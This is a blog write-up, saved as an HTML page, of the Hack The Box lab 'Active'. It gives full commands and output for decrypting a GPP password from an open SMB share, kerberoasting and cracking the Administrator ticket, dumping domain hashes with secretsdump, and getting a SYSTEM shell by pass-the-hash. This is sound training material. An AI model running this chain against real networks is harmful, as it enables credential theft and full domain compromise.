<!doctype html><html lang=en dir=auto data-theme=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>From GPP to Domain Admin: Cracking HTB 'Active' | Fieryrival's Blog</title><meta name=keywords content="windows,AD,GPP"><meta name=description content="Easy rated windows AD box from hackthebox comprising GPP and kerberoasting."><meta name=author content><link rel=canonical href=//localhost:1313/posts/active/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=//localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=//localhost:1313/apple-touch-icon.png><link rel=mask-icon href=//localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/posts/active/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="//localhost:1313/posts/active/"><meta property="og:site_name" content="Fieryrival's Blog"><meta property="og:title" content="From GPP to Domain Admin: Cracking HTB 'Active'"><meta property="og:description" content="Easy rated windows AD box from hackthebox comprising GPP and kerberoasting."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-20T00:00:00+00:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="AD"><meta property="article:tag" content="GPP"><meta property="og:image" content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="From GPP to Domain Admin: Cracking HTB 'Active'"><meta name=twitter:description content="Easy rated windows AD box from hackthebox comprising GPP and kerberoasting."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"From GPP to Domain Admin: Cracking HTB 'Active'","item":"//localhost:1313/posts/active/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"From GPP to Domain Admin: Cracking HTB 'Active'","name":"From GPP to Domain Admin: Cracking HTB \u0027Active\u0027","description":"Easy rated windows AD box from hackthebox comprising GPP and kerberoasting.","keywords":["windows","AD","GPP"],"articleBody":"Active Box Info Active was an easy rated AD box created by eks and mrb3n.\nIt involves decrypting GPP password for user credentials which we get from null authenticated readable SMB share. Further kerberoasting administrator for gaining system access.\nRecon Nmap PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-10-19 09:34:58Z) 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack 464/tcp open kpasswd5? syn-ack 593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack 3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack 49152/tcp open msrpc syn-ack Microsoft Windows RPC 49153/tcp open msrpc syn-ack Microsoft Windows RPC 49154/tcp open msrpc syn-ack Microsoft Windows RPC 49155/tcp open msrpc syn-ack Microsoft Windows RPC 49157/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc syn-ack Microsoft Windows RPC 49165/tcp open msrpc syn-ack Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows We can see a lot of ports open including kerberos, SMB, LDAP, RPC, etc. Its most likely a domain controller.\nI start with enum4linux.py for RPC enumeration and we can get the domain details. Lets add them on our hosts file.\n=========================================================== | Domain Information via SMB session for 10.10.10.100 | =========================================================== [*] Enumerating via unauthenticated SMB session on 445/tcp [+] Found domain information via SMB NetBIOS computer name: DC NetBIOS domain name: ACTIVE DNS domain: active.htb FQDN: DC.active.htb Derived membership: domain member Derived domain: ACTIVE SMB Enumeration Then we move onto SMB shares. Initially checking for null authentication and we get some shares as readable.\nHere Replication share is readable with null authentication.\nroot@ea1feccfa881:/usr/src/crackmapexec# cme smb 10.10.10.100 -u '' -p '' --shares SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\: SMB 10.10.10.100 445 DC [*] Enumerated shares SMB 10.10.10.100 445 DC Share Permissions Remark SMB 10.10.10.100 445 DC ----- ----------- ------ SMB 10.10.10.100 445 DC ADMIN$ Remote Admin SMB 10.10.10.100 445 DC C$ Default share SMB 10.10.10.100 445 DC IPC$ Remote IPC SMB 10.10.10.100 445 DC NETLOGON Logon server share SMB 10.10.10.100 445 DC Replication READ SMB 10.10.10.100 445 DC SYSVOL Logon server share SMB 10.10.10.100 445 DC Users It was a non-default share so I looked into the files and found some interesting information related to GPP in the file active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml .\n┌─[noob@parrot]─[~/htb/active/anon_smb] └──╼ $find . -type f ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol ./active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI ./active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf ┌─[noob@parrot]─[~/htb/active/anon_smb] └──╼ $cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cGroups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"\u003e\u003cUser clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"\u003e\u003cProperties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/\u003e\u003c/User\u003e \u003c/Groups\u003e Group Policy Preferences It provides the useful capability to leverage Group Policy to “deploy” scheduled tasks with explicit credentials and change the local admin passwords on large numbers of computers at once – probably the two most popular usage scenarios.\nOne of the most useful features of Group Policy Preferences (GPP) is the ability to store and use credentials in several scenarios. These include: Map drives (Drives.xml), Create Local Users, Data Sources (DataSources.xml), Printer configuration (Printers.xml), Create/Update Services (Services.xml), Scheduled Tasks (ScheduledTasks.xml), Change local Administrator passwords, etc.\nWhen a new GPP (Group Policy Preference) is created, a corresponding XML file is generated to store the relevant configuration data. If a password is present, it is encrypted using AES-256-bit encryption. Within the XML file, the cpassword field contains the encrypted password. However, in around 2012, Microsoft released the AES private key, which made it relatively easy to decrypt the password. link\nThe tool gpp-decrypt automates the process for us and we can get the password from the encrypted text.\n┌─[✗]─[noob@parrot]─[~/htb/active/svc_tgs] └──╼ $gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' GPPstillStandingStrong2k18 After decrypting the password, we can verify it using either kerbrute or crackmapexec. In this case, I confirmed it using the latter.\nroot@ea1feccfa881:/usr/src/crackmapexec# cme smb 10.10.10.100 -u svc_tgs -p 'GPPstillStandingStrong2k18' --shares SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\svc_tgs:GPPstillStandingStrong2k18 SMB 10.10.10.100 445 DC [*] Enumerated shares SMB 10.10.10.100 445 DC Share Permissions Remark SMB 10.10.10.100 445 DC ----- ----------- ------ SMB 10.10.10.100 445 DC ADMIN$ Remote Admin SMB 10.10.10.100 445 DC C$ Default share SMB 10.10.10.100 445 DC IPC$ Remote IPC SMB 10.10.10.100 445 DC NETLOGON READ Logon server share SMB 10.10.10.100 445 DC Replication READ SMB 10.10.10.100 445 DC SYSVOL READ Logon server share SMB 10.10.10.100 445 DC Users READ Kerberoasting Normally, If we don’t have shell on the machine but credentials we can go for kerberoasting for lateral movement or look into LDAP for trying to understand the domain better.\n┌─[noob@parrot]─[~/htb/active/anon_smb] └──╼ $ldapsearch -x -H ldap://10.10.10.100 -D 'svc_tgs' -w 'GPPstillStandingStrong2k18' -b 'DC=active,DC=htb' '(objectClass=user)' While looking at user accounts our attention went to the fact that the administrator account has ServicePrincipalName as not null.\nWe know that a domain account is being used as a service if the SPN is not null. The goal of kerberoasting is to harvest TGS tickets of services that run on behalf of user accounts. And we know that some parts of the ticket are encrypted with keys derived from user passwords. Thus we can crack them offline.\n# Administrator, Users, active.htb dn: CN=Administrator,CN=Users,DC=active,DC=htb objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Administrator description: Built-in account for administering the computer/domain distinguishedName: CN=Administrator,CN=Users,DC=active,DC=htb instanceType: 4 whenCreated: 20180718184911.0Z whenChanged: 20231018154548.0Z uSNCreated: 8196 memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb memberOf: CN=Domain Admins,CN=Users,DC=active,DC=htb memberOf: CN=Enterprise Admins,CN=Users,DC=active,DC=htb memberOf: CN=Schema Admins,CN=Users,DC=active,DC=htb memberOf: CN=Administrators,CN=Builtin,DC=active,DC=htb uSNChanged: 114725 name: Administrator objectGUID:: jnHKJRJzf0aVWkxPEJY8Hg== userAccountControl: 66048 badPwdCount: 0 codePage: 0 countryCode: 0 badPasswordTime: 131774446554773106 lastLogoff: 0 lastLogon: 133421175785917565 logonHours:: //////////////////////////// pwdLastSet: 131764144003517228 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAArxktGAS1AL49Gv129AEAAA== adminCount: 1 accountExpires: 0 logonCount: 64 sAMAccountName: Administrator sAMAccountType: 805306368 servicePrincipalName: active/CIFS:445 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb isCriticalSystemObject: TRUE dSCorePropagationData: 20180718203435.0Z dSCorePropagationData: 20180718201454.0Z dSCorePropagationData: 20180718190545.0Z dSCorePropagationData: 20180718190545.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 133421175484525035 msDS-SupportedEncryptionTypes: 0 Here we can see that the administrator account is vulnerable to kerberoasting. We can use impackets GetUserSPN.py to request TGS ticket. Then we can crack the password offline to get credentials for the administrator.\n┌─[noob@parrot]─[~/htb/active/svc_tgs_smb] └──╼ $GetUserSPNs.py 'active.htb/svc_tgs:GPPstillStandingStrong2k18' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2023-10-18 11:46:18.591757 ┌─[noob@parrot]─[~/htb/active/svc_tgs_smb] └──╼ $GetUserSPNs.py 'active.htb/svc_tgs:GPPstillStandingStrong2k18' -request Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2023-10-18 11:46:18.591757 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8294eeac00efb6a535832717bf5a1451$4f37fdd250c515dc4f57eb3604f4ea35acbd738bb1f5bb9377d6f1783f2283790fc4d26c19c6d728cfd4fb6d9fbf08a8c8ef3d97fc9efe5cd8d42d734fbbbb793ef6afb31de509c6086cb7b753335827fb0ba395e37740ca9c97709f3c7838102dc571a870e5b3b4c0619f764f3f630f698ac304ec398c014eaecf1fda2426a5f995dece41df6edd827550027cbba0a26bc2336c3168f89c0f9be84e29b563c4bd381eaafa17c6f9ad0a72563aee92d034995dd045f1eafa4f46711b0a94b9a9cb7fa68957d909f5056cc17b4788d228df96ebce4a2c87bef518430fde760d056188875bc5d5031564f10479c30dd1206fb4f796eb907e7ead2d9d288047da59fd641a2eb15e4222441434ecdb6a544608fb89b6297893424b80fcff84645e5f53f77a504ea5d9fbfd6a708546b4d24180988325718105e1c569c92fcac0b5c69e10c3d7cf59f19cb5cd8d46a16afcd782482e3382fbf3ae75a3397feb8dc82b8ed1378dc22d967d3b5390ca475ae23657c3b228be7637b5a3fc0e891aba8a80ac58c8c0267de6cd8f20408f139775f6ef5b93b80d003abbcad161326e1a202c6af739e155be508a7daa7a52bd6bb01abb0d914a10dd671ddaea232a14a58c13a3da44294450da92b96c02684ce5113df319589beb9f8bac2f9a809dd4f26d6f67e672d9e7409799a259c70f10835794cd558daa7847bd49532c6d704c8911ad9977a6d41221bd8403c3679599cf081f7986ee849992b515e1e5df661b4716fb147f9a5d6092b445c1543a60ed7acd85d23161135d23aa159040e66d5af13c3cbcb89c2dfcd2c59ea5f57fd6e32fd04ad4b9db13932fd484576ea7d68b9af978af6ed96fc796c7ecb9a336d0027102e34fe65fc29db9fd9b9ba67e42272a7d37f9d2ef237a0bedf4f38989610d91b462a61158c311148ca89e7da0cc7477be3ea02496ce73cf27a8fcdee4c0e5374fdefaa4163770679e571601a9cd75e5d93455efb03460ccf72fe12a7cc9fee80833e65267ec9a9ed284690d6609e6c838042328d540aba7b4900a626e1f48170091bb83e9ec0857b6313990d12e8f5efc85cefcd23ff967e3bccb7bef7f66d40df50842e3737d5b9e832a939859b6b950de2f7f2b89fcfbd9a95f890b8db87bfe5b0458454571ab1d19a9688cbbd623733a12ea0b38398f644082efdb554012efbd683080de5f32370f1ce96aa920d36f48e7f22100e126e5a207ea7a634de829c8bc374d35b292ce990fb8 We can crack these either with john the ripper or hashcat. We need to know the mode in hashcat but john automatically detects the type of hash.\n┌─[noob@parrot]─[~/htb/active] └──╼ $john admin --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 3 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:08 58.29% (ETA: 06:06:55) 0g/s 1014Kp/s 1014Kc/s 1014KC/s ee0133381186..edword11 Ticketmaster1968 (?) 1g 0:00:00:10 DONE (2023-10-19 06:06) 0.09487g/s 999784p/s 999784c/s 999784C/s Tiffani1432..Thurman16 Use the \"--show\" option to display all of the cracked passwords reliably Session completed We can dump the domain hashes with secretsdump.py .\n┌─[noob@parrot]─[~/htb/active] └──╼ $secretsdump.py 'active.htb/administrator:Ticketmaster1968@10.10.10.100' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra [*] Target system bootKey: 0xff954ee81ffb63937b563f523caf1d59 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC ACTIVE\\DC$:aes256-cts-hmac-sha1-96:5de5e20ae2611f75df65633ab000d7c04b5e41c46bc1c02f90291097184d394f ACTIVE\\DC$:aes128-cts-hmac-sha1-96:022fc4401e538ae98c89bca738cb0193 ACTIVE\\DC$:des-cbc-md5:1afe5873389df29d ACTIVE\\DC$:plain_password_hex:19d2ce6f30f7603634988e3f6bd9dff85c1e66410596bfe7184e01edf6d91c8787d74c2a2d77726e018c7ca1a2be300c4fe90464be799513980c389e993c7cc894ef5d036c41cb587bcdb601622c2be5231c3e84d6cf968b158e4c75a85d0bea3664ab75261dff7ee8a623729d9c7f158f77c00c3c05188a6ce2472b4a2cfdd40e60aadb6a71554c6f58d52792c5140e63693fc0a1d4439956e6d2353ea0de25bd131d7025a7914a7d20750213e25522fceafdc3c26792abb2f5415f524367b9d4d49f12e968b924c96a02581b257529196001d1dd0640f311a9f1cb3730a92bc76813a2f071b3abc0e3f5c81b83469c ACTIVE\\DC$:aad3b435b51404eeaad3b435b51404ee:5b9f6d9fdf7d10f0c07ed64660f94fa1::: [*] DefaultPassword (Unknown User):ROOT#123 [*] DPAPI_SYSTEM dpapi_machinekey:0x377bd35be67705f345dabf00d3181e269e0fb1e6 dpapi_userkey:0x7586c391e559565c85cb342d1d24546381f0d5cb [*] NL$KM 0000 CC 6F B8 46 C3 0C 58 05 2F F2 07 2E DA E6 BF 7D .o.F..X./......} 0010 60 63 F6 89 E7 0E D5 D5 22 EE 54 DA 63 12 5B B5 `c......\".T.c.[. 0020 D8 DA 0B B7 82 0E 3D E1 9D 7A 03 15 08 5C B0 AE ......=..z...\\.. 0030 EF 63 91 B9 6C 87 65 A8 14 62 95 BC 77 69 77 08 .c..l.e..b..wiw. NL$KM:cc6fb846c30c58052ff2072edae6bf7d6063f689e70ed5d522ee54da63125bb5d8da0bb7820e3de19d7a0315085cb0aeef6391b96c8765a8146295bc77697708 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc::: active.htb\\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:5b9f6d9fdf7d10f0c07ed64660f94fa1::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8 Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe Administrator:des-cbc-md5:5891549b31f2c294 krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9 krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3 krbtgt:des-cbc-md5:9d044f891adf7629 active.htb\\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a active.htb\\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31 active.htb\\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0 DC$:aes256-cts-hmac-sha1-96:5de5e20ae2611f75df65633ab000d7c04b5e41c46bc1c02f90291097184d394f DC$:aes128-cts-hmac-sha1-96:022fc4401e538ae98c89bca738cb0193 DC$:des-cbc-md5:02861ca1a71907a1 [*] Cleaning up... We can get system shell with psexec.py .\n┌─[noob@parrot]─[~/htb/active/svc_tgs_smb] └──╼ $psexec.py 'active.htb/administrator@dc.active.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra [*] Requesting shares on dc.active.htb..... [*] Found writable share ADMIN$ [*] Uploading file AHYMkugS.exe [*] Opening SVCManager on dc.active.htb..... [*] Creating service EiEB on dc.active.htb..... [*] Starting service EiEB..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003e whoami nt authority\\system References https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast\nhttps://adsecurity.org/?p=2288\n","wordCount":"1465","inLanguage":"en","image":"//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-20T00:00:00Z","dateModified":"2025-11-20T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/posts/active/"},"publisher":{"@type":"Organization","name":"Fieryrival's Blog","logo":{"@type":"ImageObject","url":"//localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=//localhost:1313/apple-touch-icon_hu_ca5ae87867264747.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=//localhost:1313/about/ title="About Me"><span>About</span></a></li><li><a href=//localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=//localhost:1313/posts/ title=posts><span>posts</span></a></li><li><a href=//localhost:1313/ title><span></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">From GPP to Domain Admin: Cracking HTB 'Active'</h1><div class=post-meta><span title='2025-11-20 00:00:00 +0000 UTC'>November 20, 2025</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>1465 words</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#box-info>Box Info</a></li><li><a href=#recon>Recon</a><ul><li><a href=#nmap>Nmap</a></li><li><a href=#smb-enumeration>SMB Enumeration</a></li><li><a href=#group-policy-preferences>Group Policy Preferences</a></li><li><a href=#kerberoasting>Kerberoasting</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=active>Active<a hidden class=anchor aria-hidden=true href=#active>#</a></h1><h2 id=box-info>Box Info<a hidden class=anchor aria-hidden=true href=#box-info>#</a></h2><p><img alt=Active.png loading=lazy src=/posts/active/Active%20daa93a9cd54d438fa2d8f309191d4082/Active.png></p><p>Active was an easy rated AD box created by <a href=https://app.hackthebox.com/profile/302>eks</a> and <a href=https://app.hackthebox.com/profile/2984>mrb3n</a>.</p><p>It involves decrypting GPP password for user credentials which we get from null authenticated readable SMB share. Further kerberoasting administrator for gaining system access.</p><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>PORT</span>      <span class=nx>STATE</span> <span class=nx>SERVICE</span>       <span class=nx>REASON</span>  <span class=nx>VERSION</span>
</span></span><span class=line><span class=cl><span class=mi>53</span><span class=o>/</span><span class=nx>tcp</span>    <span class=nx>open</span>  <span class=nx>domain</span>        <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>DNS</span> <span class=mf>6.1.7601</span> <span class=p>(</span><span class=mi>1</span><span class=nx>DB15D39</span><span class=p>)</span> <span class=p>(</span><span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2008</span> <span class=nx>R2</span> <span class=nx>SP1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>dns</span><span class=o>-</span><span class=nx>nsid</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=o>|</span><span class=nx>_</span>  <span class=nx>bind</span><span class=p>.</span><span class=nx>version</span><span class=o>:</span> <span class=nx>Microsoft</span> <span class=nx>DNS</span> <span class=mf>6.1.7601</span> <span class=p>(</span><span class=mi>1</span><span class=nx>DB15D39</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>88</span><span class=o>/</span><span class=nx>tcp</span>    <span class=nx>open</span>  <span class=nx>kerberos</span><span class=o>-</span><span class=nx>sec</span>  <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>Kerberos</span> <span class=p>(</span><span class=nx>server</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2023</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>19</span> <span class=mi>09</span><span class=o>:</span><span class=mi>34</span><span class=o>:</span><span class=mi>58</span><span class=nx>Z</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>135</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>msrpc</span>         <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>RPC</span>
</span></span><span class=line><span class=cl><span class=mi>139</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>netbios</span><span class=o>-</span><span class=nx>ssn</span>   <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>netbios</span><span class=o>-</span><span class=nx>ssn</span>
</span></span><span class=line><span class=cl><span class=mi>389</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>ldap</span>          <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=nx>Active</span> <span class=nx>Directory</span> <span class=nx>LDAP</span> <span class=p>(</span><span class=nx>Domain</span><span class=o>:</span> <span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>,</span> <span class=nx>Site</span><span class=o>:</span> <span class=nx>Default</span><span class=o>-</span><span class=nx>First</span><span class=o>-</span><span class=nx>Site</span><span class=o>-</span><span class=nx>Name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>445</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>  <span class=nx>microsoft</span><span class=o>-</span><span class=nx>ds</span><span class=o>?</span> <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span>
